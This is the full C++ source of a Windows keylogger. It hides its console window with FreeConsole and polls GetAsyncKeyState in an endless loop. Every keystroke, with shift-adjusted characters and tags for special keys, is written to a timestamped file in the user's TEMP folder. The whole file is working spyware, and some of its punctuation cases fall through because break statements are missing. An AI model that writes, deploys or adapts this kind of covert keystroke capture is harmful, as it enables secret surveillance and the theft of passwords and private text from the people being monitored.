#include <stdio.h>      // standard input-output
#include <iostream>     // input-output stream
#include <windows.h>    // importing windows function
#include <conio.h>      // console input-output - used for debugging
#include <fstream>      // file input-output stream
#include <time.h>
#include <sstream>

using namespace std;

ofstream* createFile();
void writeToTempFile(int key, ofstream* file, boolean isShiftpressed);

int main() {
    bool isShiftPressed;

    // hide console window
    FreeConsole(); 
    
    // create file in temp directory
    ofstream* file = createFile();

    // start recording keystrokes  
    while(true){
        for (int key = 8; key <= 190; key++){
            if((GetAsyncKeyState(key) & 0x0001) != 0){ // check least significant to determine if key was pressed since last call
                if((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0){// cheack most significant bit to determine if shift is held down
                    isShiftPressed = true;
                } else {
                    isShiftPressed = false;
                }
                writeToTempFile(key, file, isShiftPressed);
            }
        }
        Sleep(10); // sleep for 10 milliseconds
    }
}

// create and open a file in tmp. directory with klgr_timestamp as name.
ofstream* createFile() {
    // get current time and convert it to string
    time_t now = time(0);
    stringstream ss;
    ss << now;
    string nowStr = ss.str();

    // get temp directory
    char* temp = getenv("TEMP");
    string tempDir(temp);

    // create file in temp directory
    ofstream* pFile = new ofstream(tempDir + "\\klgr_" + nowStr + ".tmp");; 

    // return file pointer
    return pFile;
}

void writeToTempFile(int key, ofstream* file, boolean isShiftpressed) {

    // convert key to lowercase if shift is not pressed
    if(key >= 65 && key <= 90 && !isShiftpressed){
        key += 32;
    }

    // convert key to special character if shift is pressed
    if(key >= 48 && key <= 57 && isShiftpressed){
        switch (key)
        {
            case 48:
                key = 41;
                break;
            case 49:
                key = 33;
                break;
            case 50:
                key = 64;
                break;
            case 51:
                key = 35;
                break;
            case 52:
                key = 36;
                break;
            case 53:
                key = 37;
                break;
            case 54:
                key = 94;
                break;
            case 55:
                key = 38;
                break;
            case 56:
                key = 42;
                break;
            case 57:
                key = 40;
                break;
            default:
                break;
        }
    }

    // write key to file if key is printable
    if(key >= 33 && key <= 126){
        *file << char(key);
        file->flush();
    }else{ // handle special keys
        switch(key)
        {
        case VK_SPACE:
            *file << char(key);
            file->flush();
            break;
        case VK_RETURN:
            *file << "[RETURN] \n";
            file->flush();
            break;
        case VK_TAB:
            *file << "[TAB]";
            file->flush();
            break;
        case VK_BACK:
            *file << "[BACKSPACE]";
            file->flush();
            break;
        case VK_DELETE:
            *file << "[DEL]";
            file->flush();
            break;
        case VK_UP:
            *file << "[UP]";
            file->flush();
            break;
        case VK_DOWN:
            *file << "[DOWN]";
            file->flush();
            break;
        case VK_LEFT:
            *file << "[LEFT]";
            file->flush();
            break;
        case VK_RIGHT:
            *file << "[RIGHT]";
            file->flush();
            break;
        case VK_CONTROL:
            *file << "[CTRL]";
            file->flush();
            break;
        case VK_MENU:
            *file << "[ALT]";
            file->flush();
            break;
        case VK_CAPITAL:
            *file << "[CAPSLOCK TOGGLED]";
            file->flush();
            break;
        case VK_OEM_1:
            if(isShiftpressed){
                *file << ":";
            }else{
                *file << ";";
            }
            file->flush();
            break;
        case VK_OEM_2:
            if(isShiftpressed){
                *file << "?";
            }else{
                *file << "/";
            }
            file->flush();
        case VK_OEM_3:
            if(isShiftpressed){
                *file << "~";
            }else{
                *file << "`";
            }
            file->flush();
        case VK_OEM_4:
            if(isShiftpressed){
                *file << "{";
            }else{
                *file << "[";
            }
            file->flush();
        case VK_OEM_5:
            if(isShiftpressed){
                *file << "|";
            }else{
                *file << "\\";
            }
            file->flush();
        case VK_OEM_6:
            if(isShiftpressed){
                *file << "}";
            }else{
                *file << "]";
            }
            file->flush();
        case VK_OEM_7:
            if(isShiftpressed){
                *file << "\"";
            }else{
                *file << "'";
            }
            file->flush();
        case VK_OEM_PLUS:
            if(isShiftpressed){
                *file << "+";
            }else{
                *file << "=";
            }
            file->flush();
        case VK_OEM_COMMA:
            if(isShiftpressed){
                *file << "<";
            }else{
                *file << ",";
            }
            file->flush();
        case VK_OEM_MINUS:
            if(isShiftpressed){
                *file << "_";
            }else{
                *file << "-";
            }
            file->flush();
        case VK_OEM_PERIOD:
            if(isShiftpressed){
                *file << ">";
            }else{
                *file << ".";
            }
            file->flush();
        default:
            break;
        }
    }

}

